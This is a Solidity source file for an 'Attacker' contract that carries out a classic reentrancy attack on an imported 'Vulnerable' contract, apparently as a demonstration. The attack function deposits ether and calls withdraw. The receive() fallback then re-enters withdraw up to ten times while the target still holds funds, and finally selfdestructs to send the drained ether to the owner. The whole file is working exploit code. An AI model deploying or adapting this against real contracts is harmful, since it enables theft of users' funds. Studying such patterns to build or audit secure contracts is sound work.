// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vulnerable.sol";

contract Attacker {
    Vulnerable public vulnerable;
    address payable public owner;
    uint public times;

    constructor(address _vulnerable) payable {
        vulnerable = Vulnerable(_vulnerable);
        owner = payable(msg.sender);
    }

    // inicia el ataque: deposita y lanza withdraw
    function attack() external payable {
        require(msg.value > 0, "need ether to attack");
        // deposit in vulnerable contract
        vulnerable.deposit{value: msg.value}();
        // trigger withdraw -> will reenter via receive()
        vulnerable.withdraw();
    }

    // fallback called on receiving Ether from vulnerable.withdraw()
    receive() external payable {
        // reenter while vulnerable still thinks there is balance
        if (address(vulnerable).balance >= 1 ether && times < 10) {
            times++;
            vulnerable.withdraw();
        } else {
            // send collected funds to attacker owner
            selfdestruct(owner);
        }
    }
}
